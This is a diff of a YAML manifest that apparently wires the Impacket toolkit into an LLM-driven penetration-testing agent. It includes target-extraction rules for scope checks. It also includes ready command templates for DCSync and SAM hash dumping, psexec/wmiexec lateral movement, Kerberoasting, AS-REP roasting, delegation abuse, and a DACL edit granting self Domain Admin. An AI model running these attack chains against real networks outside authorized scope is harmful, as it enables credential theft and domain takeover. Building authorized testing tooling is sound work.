@@ -1,2938 +1,451 @@
 name: impacket
-version: "2.0"
-description: "Windows/Active Directory exploitation toolkit (Impacket 0.12). 50 methods in 10 categories: remote execution (psexec, wmiexec, smbexec, dcomexec, atexec), credential dumping (secretsdump), Kerberos attacks (kerberoast, asreproast, get_tgt, get_st, ticketer, ticket_converter, describe_ticket, get_pac), SMB operations (smb_shares, smb_get, smb_put), AD enumeration (get_ad_users, get_ad_computers, lookupsid, samrdump, rpcdump, rpcmap, dump_ntlm_info, machine_role, get_arch), delegation abuse (addcomputer, find_delegation, rbcd), account modification (changepasswd, addspn), ACL attacks (dacledit, owneredit), credential extraction (get_laps_password, get_gpp_password, dpapi_backupkeys, keylistattack), services & remote management (services, reg, net, mssqlclient, mssqlinstance, wmiquery, wmipersist, tstool, exchanger, rdp_check), privilege escalation (golden_pac, raise_child), custom scripts (run_custom). All methods support password, NTLM hash (pass-the-hash), Kerberos, and AES key authentication."
+kind: cli
+# binary: omitted intentionally — multi-sub-binary toolkit. Each usage_pattern
+# below declares its own `binary:` field, and tool_runner passes that through
+# to cli_in_container as an explicit binary arg (overriding the absent
+# top-level binary). 47 sub-binaries on PATH inside the image.
 image: "ghcr.io/silicon-works/mcp-tools-impacket:latest"
-image_size_mb: 900
-timeout_seconds: 300
-idle_timeout: 1800
-
+image_size_mb: 300
+timeout_seconds: 600
+version: "0.12.x"
+description: "Active Directory and SMB attack toolkit (47 Python sub-binaries: secretsdump, psexec, wmiexec, smbexec, GetUserSPNs, GetNPUsers, getTGT, getST, smbclient, lookupsid, mssqlclient, addcomputer, findDelegation, rbcd, changepasswd, dacledit, owneredit, ticketer, ...). Covers DCSync, lateral movement (psexec/wmiexec/smbexec/dcomexec/atexec), Kerberos (kerberoast, AS-REP roast, ticket forging, S4U2Self/Proxy, golden/silver tickets), SMB/RPC enumeration (smbclient, samrdump, lookupsid, rpcdump), MSSQL (mssqlclient, mssqlinstance), AD ACL/attribute editing (dacledit, owneredit, addcomputer, addspn, rbcd), and credential dumping (LAPS, GPP passwords, DPAPI backup keys). Each sub-binary has its own CLI surface; the LLM constructs the full invocation."
 capabilities:
-  - remote_execution
-  - credential_dumping
-  - pass_the_hash
-  - kerberos_attacks
+  - active_directory_attack
+  - credential_dump
+  - kerberos_attack
   - smb_operations
-  - ad_enumeration
-  - rbcd_delegation
-  - password_reset
-  - spn_manipulation
-  - acl_attacks
-  - golden_ticket
-  - silver_ticket
-  - laps_extraction
-  - gpp_password
-  - service_manipulation
-  - registry_manipulation
-  - wmi_queries
-  - mssql_client
+  - lateral_movement
+  - post_exploitation
+  - mssql_operations
   - rpc_enumeration
-  - dpapi_keys
-  - terminal_services
-  - exchange_abuse
-  - privilege_escalation
-  - custom_scripts
 
 phases:
   - enumeration
   - exploitation
-  - post-exploitation
+  - post_exploitation
+
+routing:
+  use_for:
+    - "DCSync — dump all domain user NT hashes from a Domain Controller"
+    - "Kerberoast — request TGS tickets for SPN-bound accounts and crack offline"
+    - "AS-REP roast — extract AS-REP for accounts with DONT_REQUIRE_PREAUTH"
+    - "lateral movement via SMB-based exec (psexec/smbexec) for admin shells"
+    - "lateral movement via WMI/DCOM exec (wmiexec/dcomexec) — stealthier than psexec"
+    - "lateral movement via task scheduler (atexec) — file-less but slow"
+    - "obtain or convert Kerberos tickets (getTGT, getST, ticket_converter)"
+    - "S4U2Self/Proxy constrained delegation abuse (getST -impersonate)"
+    - "enumerate SMB shares and download/upload files (smbclient)"
+    - "RID brute force enumeration of domain users (lookupsid)"
+    - "MSSQL operations: query, xp_cmdshell, dump (mssqlclient)"
+    - "find delegation paths (findDelegation: unconstrained, constrained, RBCD)"
+    - "create AD computer accounts (addcomputer) — used for RBCD attacks"
+    - "edit DACL/owner of AD objects (dacledit, owneredit) — abuse WriteDACL/WriteOwner"
+    - "configure resource-based constrained delegation (rbcd)"
+    - "forge golden / silver / sapphire Kerberos tickets (ticketer)"
+    - "extract LAPS or GPP cleartext passwords from AD (get_laps_password, get_gpp_password)"
+    - "DPAPI domain backup key retrieval (dpapi_backupkeys)"
+  never_use_for:
+    - "interactive SMB sessions across many commands — use shell-session"
+    - "NTLM relaying server (ntlmrelayx is stateful; treat as Tier B/MCP for now)"
+    - "Kerberos username enumeration — use kerbrute (much faster, no creds needed)"
+    - "password spraying — use kerbrute or netexec"
+    - "SMB share content brute-forcing — use smbmap or netexec --shares --spider"
+    - "in-memory credential dumping on a host you already shell — use lsassy / nanodump"
+  triggers:
+    - "impacket"
+    - "secretsdump"
+    - "psexec"
+    - "wmiexec"
+    - "smbexec"
+    - "dcomexec"
+    - "atexec"
+    - "kerberoast"
+    - "GetUserSPNs"
+    - "asreproast"
+    - "GetNPUsers"
+    - "getTGT"
+    - "getST"
+    - "DCSync"
+    - "S4U2Self"
+    - "S4U2Proxy"
+    - "ticketer"
+    - "golden ticket"
+    - "silver ticket"
+    - "rbcd"
+    - "addcomputer"
+    - "dacledit"
+    - "lookupsid"
+    - "RID brute"
+    - "smbclient"
+    - "mssqlclient"
 
 requirements:
   network: true
   privileged: false
 
 resources:
-  memory_mb: 512
+  memory_mb: 256
   cpu: 0.5
 
-routing:
-  use_for:
-    - "Windows remote command execution"
-    - "pass-the-hash authentication"
-    - "NTLM hash pass-the-hash"
-    - "credential dumping from Windows"
-    - "SAM database extraction"
-    - "NTDS.dit dump"
-    - "secretsdump"
-    - "kerberoasting"
-    - "AS-REP roasting"
-    - "SMB share enumeration"
-    - "SMB file transfer"
-    - "Active Directory user enumeration"
-    - "SID enumeration"
-    - "Kerberos TGT request"
-    - "Windows lateral movement"
-    - "psexec wmiexec smbexec"
-    - "constrained delegation abuse"
-    - "S4U2Self S4U2Proxy service ticket"
-    - "RBCD resource-based constrained delegation"
-    - "create machine account for delegation attack"
-    - "enumerate delegation settings across domain"
-    - "getST impersonation via delegation"
-  never_use_for:
-    - "Linux-only targets"
-    - "port scanning"
-    - "web application testing"
-    - "SQL injection"
-    - "password brute-forcing (use hydra instead)"
-    - "vulnerability scanning"
-  triggers:
-    - "impacket"
-    - "psexec"
-    - "wmiexec"
-    - "smbexec"
-    - "dcomexec"
-    - "atexec"
-    - "secretsdump"
-    - "kerberoast"
-    - "asreproast"
-    - "pass-the-hash"
-    - "pass the hash"
-    - "pth"
-    - "ntlm hash"
-    - "GetUserSPNs"
-    - "GetNPUsers"
-    - "GetADUsers"
-    - "lookupsid"
-    - "getTGT"
-    - "getST"
-    - "addcomputer"
-    - "findDelegation"
-    - "constrained delegation"
-    - "unconstrained delegation"
-    - "RBCD"
-    - "S4U"
-    - "machine account"
-    - "rbcd.py"
-    - "changepasswd"
-    - "ForceChangePassword"
-    - "addspn"
-    - "SPN injection"
-    - "password reset"
-    - "dacledit"
-    - "owneredit"
-    - "WriteDACL"
-    - "WriteOwner"
-    - "ticketer"
-    - "golden ticket"
-    - "silver ticket"
-    - "ticket_converter"
-    - "describeTicket"
-    - "getPac"
-    - "LAPS password"
-    - "GetLAPSPassword"
-    - "GPP password"
-    - "cpassword"
-    - "DPAPI backup key"
-    - "keylistattack"
-    - "RODC"
-    - "samrdump"
-    - "rpcdump"
-    - "rpcmap"
-    - "DumpNTLMInfo"
-    - "GetADComputers"
-    - "services"
-    - "sc.exe"
-    - "reg query"
-    - "registry"
-    - "net user"
-    - "mssqlclient"
-    - "mssqlinstance"
-    - "wmiquery"
-    - "WQL"
-    - "wmipersist"
-    - "tstool"
-    - "qwinsta"
-    - "exchanger"
-    - "NSPI"
-    - "goldenPac"
-    - "MS14-068"
-    - "raiseChild"
-    - "forest trust"
-    - "rdp_check"
-    - "machine_role"
-    - "getArch"
-    - "add new impacket method"
-    - "create impacket recipe"
-    - "extend impacket"
-    - "custom impacket binary"
-  prefer_over: []
-
 see_also:
-  - tool: netexec
-    reason: "Alternative for credential validation and authenticated execution"
-  - tool: evil-winrm
-    reason: "Alternative for WinRM shell access"
   - tool: kerbrute
-    reason: "Use kerbrute for Kerberos username enumeration via AS-REQ — discovers unknown usernames without credentials. Impacket's lookupsid needs SMB null session."
+    reason: "Use kerbrute for username enumeration and password spraying (faster, no creds); use impacket for the actual attack chain"
+  - tool: netexec
+    reason: "netexec for credential validation across many hosts and protocols; impacket for the per-host operation"
+  - tool: john
+    reason: "Crack Kerberoast TGS hashes (--krb5tgs format) and AS-REP hashes (--krb5asrep format)"
+  - tool: hashcat
+    reason: "GPU cracker; faster on TGS/asrep hashes for large wordlists"
   - tool: bloodhound
-    reason: "Use bloodhound for AD relationship mapping and attack path discovery after obtaining initial credentials."
+    reason: "Find attack paths after enumerating users/groups; impacket executes the chosen path"
   - tool: certipy
-    reason: "Use certipy for AD Certificate Services (ADCS) enumeration and exploitation — covers ESC1-8 vulnerabilities."
+    reason: "ADCS-specific attacks (ESC1-ESC15); impacket handles general AD/SMB"
+  - tool: shell-session
+    reason: "After psexec/wmiexec returns a shell, use shell-session to maintain it across commands"
 
-methods:
-  psexec:
-    required_ports: [445]
-    description: "Execute commands on a remote Windows host via PsExec (creates a service, most reliable but noisy)"
-    when_to_use: "When reliable remote execution is needed and stealth is not critical. Uses SMB service creation."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      command:
-        type: string
-        description: "Command to execute (omit for interactive shell)"
-      service_name:
-        type: string
-        description: "Custom service name for stealth"
-      remote_binary_name:
-        type: string
-        description: "Custom name for the uploaded executable on the target"
-      upload_file:
-        type: string
-        description: "Local file to upload and execute on the target (use command param for arguments)"
-      codec:
-        type: string
-        default: "utf-8"
-        description: "Output codec"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string (e.g., '-path C:\\Windows -debug')"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      method:
-        type: string
-        description: "Execution method used (psexec)"
-      output:
-        type: string
-        description: "Command output"
-      info:
-        type: array
-        description: "Informational messages"
-      warnings:
-        type: array
-        description: "Warning messages"
+# ── kind:cli specific sections ──────────────────────────────────────
 
-  wmiexec:
-    required_ports: [135]
-    description: "Execute commands on a remote Windows host via WMI (stealthier than psexec, no service creation)"
-    when_to_use: "When stealth matters - no service creation, uses WMI for execution. Preferred for lateral movement."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port (default: 135 for WMI)"
-      command:
-        type: string
-        description: "Command to execute"
-      nooutput:
-        type: boolean
-        default: false
-        description: "Do not retrieve command output (blind execution)"
-      shell_type:
-        type: string
-        enum: [cmd, powershell]
-        description: "Shell type for semi-interactive mode (cmd or powershell)"
-      silentcommand:
-        type: boolean
-        default: false
-        description: "Skip cmd.exe wrapper — directly execute via WMI (no output possible)"
-      share:
-        type: string
-        description: "Share for output retrieval (default: ADMIN$)"
-      codec:
-        type: string
-        default: "utf-8"
-        description: "Output codec"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      method:
-        type: string
-        description: "Execution method used (wmiexec)"
-      output:
-        type: string
-        description: "Command output"
+target_extraction:
+  # impacket positional target form is `[domain/]user[:password]@host` — most
+  # binaries (secretsdump, psexec, wmiexec, smbclient, mssqlclient, etc.) use
+  # this. Domain and password are optional. Host is the connection target.
+  #
+  # The regex carefully:
+  #   - Optionally consumes `domain/`  (^(?:[^/@\s]+/)?)
+  #   - Consumes `user[:password]`     ([^@\s]+)
+  #   - Captures host after @          @([^:/?#\s]+)   <- group 1
+  - rule: "positional_match"
+    pattern: '^(?:[^/@\s]+/)?[^@\s]+@([^:/?#\s]+)'
+    group: 1
+    parse_as: "raw"
 
-  smbexec:
-    required_ports: [445]
-    description: "Execute commands on a remote Windows host via SMB (native commands, no binary upload needed)"
-    when_to_use: "When other methods fail or when you want native command execution without uploading binaries"
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      command:
-        type: string
-        description: "Command to execute"
-      share:
-        type: string
-        default: "C$"
-        description: "Writable share for output"
-      mode:
-        type: enum
-        values: [SHARE, SERVER]
-        default: SHARE
-        description: "Execution mode"
-      codec:
-        type: string
-        default: "utf-8"
-        description: "Output codec"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      method:
-        type: string
-        description: "Execution method used (smbexec)"
-      output:
-        type: string
-        description: "Command output"
+  # Some binaries take an explicit -target / -target-ip flag. Used by
+  # ntlmrelayx (-t), getST (-spn target), and as override for SPN resolution.
+  - rule: "flag_value"
+    flag: "-target"
+    parse_as: "raw"
+  - rule: "flag_value"
+    flag: "-target-ip"
+    parse_as: "raw"
 
-  dcomexec:
-    required_ports: [135]
-    description: "Execute commands on a remote Windows host via DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)"
-    when_to_use: "Alternative lateral movement using DCOM. Useful when SMB-based methods are blocked."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port (default: 135 for DCOM)"
-      command:
-        type: string
-        description: "Command to execute"
-      dcom_object:
-        type: enum
-        values: [MMC20, ShellWindows, ShellBrowserWindow]
-        default: MMC20
-        description: "DCOM object to use for execution"
-      nooutput:
-        type: boolean
-        default: false
-        description: "Do not retrieve command output"
-      silentcommand:
-        type: boolean
-        default: false
-        description: "Skip cmd.exe wrapper (direct execution, no output)"
-      codec:
-        type: string
-        default: "utf-8"
-        description: "Output codec"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      method:
-        type: string
-        description: "Execution method used (dcomexec)"
-      object:
-        type: string
-        description: "DCOM object used"
-      output:
-        type: string
-        description: "Command output"
+  # Fallback: GetUserSPNs / GetNPUsers / changepasswd accept ONLY
+  # `[domain/]user[:password]` (no @host) — the DC is the operational target,
+  # specified via -dc-ip. This rule fires last so it never overrides a real
+  # positional/-target. Listed here so getuserspns/getnpusers/changepasswd
+  # commands don't return target=null and bypass scope validation.
+  - rule: "flag_value"
+    flag: "-dc-ip"
+    parse_as: "raw"
 
-  atexec:
-    required_ports: [445]
-    description: "Execute commands on a remote Windows host via Task Scheduler (scheduled task based execution)"
-    when_to_use: "When other execution methods are blocked. Uses Windows Task Scheduler for command execution."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      command:
-        type: string
-        required: true
-        description: "Command to execute via scheduled task"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      codec:
-        type: string
-        default: "utf-8"
-        description: "Output codec"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-    returns:
-      method:
-        type: string
-        description: "Execution method used (atexec)"
-      output:
-        type: string
-        description: "Command output"
+# Flags whose presence makes target scope un-validatable. Empty for impacket —
+# unlike sqlmap's -r/-l/-m/-g, impacket binaries don't have multi-target
+# file-loading patterns. ntlmrelayx is special (multi-target -t / -tf) but is
+# excluded from this pilot (it's stateful — Tier B candidate).
+reject_flags: []
 
+# Flag values that must NOT be confused with positional targets. The DSL
+# merges these with its built-in defaults. Critical entry: -dc-ip is auth
+# infrastructure, NOT the attack target — only used by target_extraction's
+# fallback rule above when no positional/-target is present.
+value_flags:
+  # Auth / Kerberos
+  - "-dc-ip"          # KDC for Kerberos lookup, only the attack target when no positional present
+  - "-dc-host"
+  - "-hashes"         # NTLM hash 'LM:NT' or ':NT'
+  - "-aesKey"         # Kerberos AES key (128/256-bit hex)
+  - "-no-pass"        # boolean flag; no value, but listed for safety
+  - "-k"              # boolean flag; use Kerberos auth
+  - "-rpc-auth-level" # rpc auth level
+  - "-codec"          # output codec
+  - "-domain-sid"
+  # Output / behavior
+  - "-output-file"
+  - "-outputfile"     # GetUserSPNs / GetNPUsers spelling variant
+  - "-format"
+  - "-history"
+  - "-just-dc"
+  - "-just-dc-ntlm"
+  - "-just-dc-user"
+  - "-pwd-last-set"
+  - "-resumefile"
+  - "-system"
+  - "-bootkey"
+  - "-share"
+  - "-port"
+  - "-debug"
+  - "-ts"
+  - "-encoder"
+  - "-server"
+  - "-request"        # boolean for kerberoast
+  - "-usersfile"      # file of usernames (for GetNPUsers / lookupsid)
+  - "-no-preauth"
+  - "-impersonate"    # S4U2Self impersonation user — value is a USERNAME, not target
+  - "-spn"            # SPN value (e.g., cifs/dc01) — not the connection target
+  - "-self"
+  - "-altservice"
+  - "-additional-ticket"
+  - "-renew"
+  - "-validate"
+  - "-no-encryption"
+  - "-q"              # mssqlclient SQL query
+  - "-file"
+  - "-wmi-namespace"
+  # ntlmrelayx (multi-target listener — but listed here in case agent uses)
+  - "-t"
+  - "-tf"
+  - "-w"
+  - "-wh"
+  - "-wa"
+  - "-l"
+  - "-lh"
+
+usage_patterns:
+  # ── DCSync / credential dump ─────────────────────────────────────
+  - name: "DCSync — dump all domain user NT hashes (NTLM only)"
+    binary: "impacket-secretsdump"
+    command: "{domain}/{user}:{password}@{dc_host} -just-dc-ntlm -outputfile /session/loot/secretsdump"
+    when: "Post-exploitation: extract every domain user's NT hash from the DC via DCSync (DRSUAPI). Requires DA or 'Replicating Directory Changes' permission. Outputs hashes.txt + ntds.json under /session/loot/."
+
+  - name: "DCSync via Kerberos ticket (no password)"
+    binary: "impacket-secretsdump"
+    command: "{domain}/{user}@{dc_host} -k -no-pass -just-dc-ntlm -outputfile /session/loot/secretsdump"
+    when: "Same as DCSync but using existing Kerberos ccache (KRB5CCNAME env). Ideal after getTGT or pass-the-ticket."
+
+  - name: "Local secrets dump (SAM + LSA from a member host)"
+    binary: "impacket-secretsdump"
+    command: "{domain}/{user}:{password}@{target} -outputfile /session/loot/{target}-local"
+    when: "Dump local SAM, LSA secrets, cached domain creds from a member server/workstation. Requires local admin. Different from DCSync (which targets the DC)."
+
+  # ── Lateral movement ─────────────────────────────────────────────
+  - name: "Lateral movement — psexec (SMB-based service exec)"
+    binary: "impacket-psexec"
+    command: "{domain}/{user}:{password}@{target}"
+    when: "Get an interactive SYSTEM shell on a Windows target via SMB-based service execution. Requires admin creds. Most reliable, but creates an obvious service event."
+
+  - name: "Lateral movement — psexec via Kerberos"
+    binary: "impacket-psexec"
+    command: "{domain}/{user}@{target} -k -no-pass"
+    when: "Same as psexec but using existing Kerberos ticket. Works against modern hardened targets that disable NTLM."
+
+  - name: "Lateral movement — wmiexec (DCOM-based, no service)"
+    binary: "impacket-wmiexec"
+    command: "{domain}/{user}:{password}@{target}"
+    when: "Get a semi-interactive shell via WMI (no service created). Stealthier than psexec but commands are less interactive (each command is a separate WMI call)."
+
+  - name: "Lateral movement — smbexec (SMB pipes)"
+    binary: "impacket-smbexec"
+    command: "{domain}/{user}:{password}@{target}"
+    when: "Alternative to psexec when the latter fails. Native SMB pipes; less reliable but quieter than psexec on some targets."
+
+  - name: "Lateral movement — dcomexec (DCOM ShellWindows / ShellBrowserWindow / MMC20)"
+    binary: "impacket-dcomexec"
+    command: "{domain}/{user}:{password}@{target}"
+    when: "Lateral movement via DCOM objects. Stealthiest of the four exec methods but most fragile (target needs DCOM enabled and not blocked by firewall)."
+
+  - name: "Lateral movement — atexec (Task Scheduler)"
+    binary: "impacket-atexec"
+    command: "{domain}/{user}:{password}@{target} '{command}'"
+    when: "Execute a single command via the Windows Task Scheduler. File-less but slow (10-30s per command). Useful when SMB/RPC service execution is blocked."
+
+  # ── Kerberos attacks ─────────────────────────────────────────────
+  - name: "Kerberoast — request TGS for all SPN accounts"
+    binary: "impacket-GetUserSPNs"
+    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/loot/kerberoast.txt"
+    when: "Enumerate accounts with SPNs and request their TGS tickets (for offline cracking). Any domain user can run this. Outputs $krb5tgs$ hashes. NOTE: the binary is impacket-GetUserSPNs (camelCase) — common typo: impacket-getuserspns does NOT exist."
+
+  - name: "AS-REP roast — extract hashes for DONT_REQUIRE_PREAUTH accounts"
+    binary: "impacket-GetNPUsers"
+    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/loot/asreproast.txt"
+    when: "Find accounts with Kerberos preauth disabled and extract their AS-REP for offline cracking. Authenticated form. NOTE: binary is impacket-GetNPUsers (camelCase)."
+
+  - name: "AS-REP roast — unauthenticated (with username list)"
+    binary: "impacket-GetNPUsers"
+    command: "{domain}/ -dc-ip {dc_ip} -no-pass -usersfile {users_file} -outputfile /session/loot/asreproast.txt"
+    when: "AS-REP roast WITHOUT credentials. Pass a newline-separated username file (often from kerbrute userenum). The trailing slash after domain is required."
+
+  - name: "Get a Kerberos TGT (for pass-the-ticket / pass-the-key)"
+    binary: "impacket-getTGT"
+    command: "{domain}/{user}:{password} -dc-ip {dc_ip}"
+    when: "Request a TGT and save it to a ccache file (current dir = /session). Set KRB5CCNAME=/session/<user>.ccache to use it for subsequent -k -no-pass calls. Foundational step for Kerberos-based attacks."
+
+  - name: "Get a TGT with NT hash (overpass-the-hash)"
+    binary: "impacket-getTGT"
+    command: "{domain}/{user} -hashes :{nt_hash} -dc-ip {dc_ip}"
+    when: "Convert an NTLM hash into a Kerberos TGT (overpass-the-hash). Useful when you have a hash from secretsdump but the target requires Kerberos auth."
+
+  - name: "S4U2Self/Proxy — impersonate a user via constrained delegation"
+    binary: "impacket-getST"
+    command: "{domain}/{user}:{password} -spn {target_spn} -impersonate {victim_user} -dc-ip {dc_ip}"
+    when: "Abuse constrained delegation: get a service ticket for {target_spn} as {victim_user}. Requires the controlled account to have constrained delegation rights. Output is a ccache file in CWD (= /session)."
+
+  # ── Enumeration ──────────────────────────────────────────────────
+  - name: "RID brute force — enumerate domain users"
+    binary: "impacket-lookupsid"
+    command: "{domain}/{user}:{password}@{dc_host}"
+    when: "Enumerate domain users via SID lookup (RID brute). Lists every user/group/computer SID. Often works even when LDAP is restricted. Default RID range 0-4000 is fine for most domains."
+
+  - name: "SMB share enumeration + interactive client"
+    binary: "impacket-smbclient"
+    command: "{domain}/{user}:{password}@{target}"
+    when: "Interactive SMB client (like smbclient(1) but Python). Use this to enumerate shares and download/upload files. Often used after secretsdump to navigate a target. Note: opens an interactive prompt — for one-shot commands prefer netexec smb."
+
+  - name: "MSSQL — query and command execution"
+    binary: "impacket-mssqlclient"
+    command: "{domain}/{user}:{password}@{target} -windows-auth"
+    when: "Connect to a Microsoft SQL Server. Use -windows-auth for AD authentication, omit for local SQL auth. Once connected: enable_xp_cmdshell, xp_cmdshell 'whoami', SELECT @@version, etc."
+
+  - name: "Find delegation paths in the domain"
+    binary: "impacket-findDelegation"
+    command: "{domain}/{user}:{password} -dc-ip {dc_ip}"
+    when: "Enumerate accounts with delegation rights (unconstrained, constrained, resource-based). Critical for finding privesc paths to DA. NOTE: binary is impacket-findDelegation (camelCase)."
+
+  # ── AD object editing ───────────────────────────────────────────
+  - name: "Create a machine account in the domain"
+    binary: "impacket-addcomputer"
+    command: "{domain}/{user}:{password} -computer-name '{machine_name}$' -computer-pass '{machine_password}' -dc-host {dc_host}"
+    when: "Create a new machine account (any domain user can create up to MachineAccountQuota=10 by default). Used for RBCD attacks and as a pivot principal."
+
+  - name: "Configure Resource-Based Constrained Delegation"
+    binary: "impacket-rbcd"
+    command: "-action write -delegate-to '{victim_computer}$' -delegate-from '{controlled_computer}$' {domain}/{user}:{password}"
+    when: "Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on {victim_computer}, pointing to {controlled_computer}. Used in conjunction with addcomputer + getST -impersonate to escalate to admin on victim."
+
+  - name: "Edit DACL on an AD object"
+    binary: "impacket-dacledit"
+    command: "-action write -rights FullControl -principal '{controlled_user}' -target '{target_object}' {domain}/{user}:{password}"
+    when: "Grant {controlled_user} FullControl over {target_object}. Used after finding WriteDACL on a privileged group or user (e.g., from BloodHound). Common path: WriteDACL on Domain Admins → grant self DA."
+
+output_formats:
+  # Most impacket binaries are prose-output. The few exceptions:
+  #   - GetUserSPNs / GetNPUsers: -outputfile writes hashes (`$krb5tgs$` /
+  #     `$krb5asrep$`) one per line (NOT JSON, but parseable).
+  #   - secretsdump: -outputfile writes hashes.txt + ntds.json (JSON for
+  #     ntds!), plus prints to stdout.
+  - flag: "-outputfile {path}"
+    format: "hashes_file"
+    preferred: true
+  - flag: "-output-file {path}"
+    format: "hashes_file"
+    preferred: false
+  - flag: "-debug"
+    format: "verbose_prose"
+    preferred: false
+  - flag: "-ts"
+    format: "timestamps"
+    preferred: false
+
+common_options:
+  authentication:
+    - "[domain/]user[:password]@host: positional target form (most binaries)"
+    - "-hashes [LM]:NT: pass-the-hash (LM is usually empty: -hashes :NThash)"
+    - "-aesKey HEX: Kerberos AES128 (32 hex) or AES256 (64 hex) key"
+    - "-k: use Kerberos auth (reads ccache from KRB5CCNAME env)"
+    - "-no-pass: don't prompt for password (use with -k or -hashes)"
+    - "-dc-ip IP: KDC IP (Kerberos resolution); auth path, NOT the attack target"
+    - "-dc-host FQDN: explicit DC FQDN (alternative to -dc-ip)"
+  output:
+    - "-outputfile FILE: write hashes / results to file (camelCase varies by binary)"
+    - "-debug: verbose output to stderr"
+    - "-ts: prefix log lines with timestamps"
   secretsdump:
-    required_ports: [445]
-    description: "Dump credentials from a Windows host (SAM, LSA secrets, cached creds, NTDS.dit via DRSUAPI/VSS)"
-    when_to_use: "After gaining admin access to dump password hashes. Use -just-dc on domain controllers for NTDS.dit."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication (needs admin privileges)"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target SMB port (default: 445)"
-      just_dc:
-        type: boolean
-        default: false
-        description: "Only extract NTDS.dit data via DRSUAPI (DC only, much faster)"
-      just_dc_ntlm:
-        type: boolean
-        default: false
-        description: "Only extract NTLM hashes from NTDS.dit"
-      just_dc_user:
-        type: string
-        description: "Extract only this user's hash from NTDS.dit"
-      use_vss:
-        type: boolean
-        default: false
-        description: "Use Volume Shadow Copy instead of DRSUAPI"
-      exec_method:
-        type: enum
-        values: [smbexec, wmiexec, mmcexec]
-        description: "Remote execution method for VSS"
-      history:
-        type: boolean
-        default: false
-        description: "Dump password history and LSA secrets OldVal"
-      pwd_last_set:
-        type: boolean
-        default: false
-        description: "Show pwdLastSet attribute for each NTDS.dit account"
-      user_status:
-        type: boolean
-        default: false
-        description: "Display whether each user is disabled"
-      skip_sam:
-        type: boolean
-        default: false
-        description: "Do NOT parse the SAM hive on remote system"
-      use_keylist:
-        type: boolean
-        default: false
-        description: "Use Kerb-Key-List method instead of DRSUAPI"
-      ldapfilter:
-        type: string
-        description: "LDAP filter for DRSUAPI extraction (e.g., '(sAMAccountName=admin*)')"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 600
-        description: "Timeout in seconds (credential dumping can be slow)"
-    returns:
-      sam_hashes:
-        type: array
-        description: "Local SAM hashes (user:rid:lm:nt:::)"
-      lsa_secrets:
-        type: array
-        description: "LSA secrets"
-      cached_creds:
-        type: array
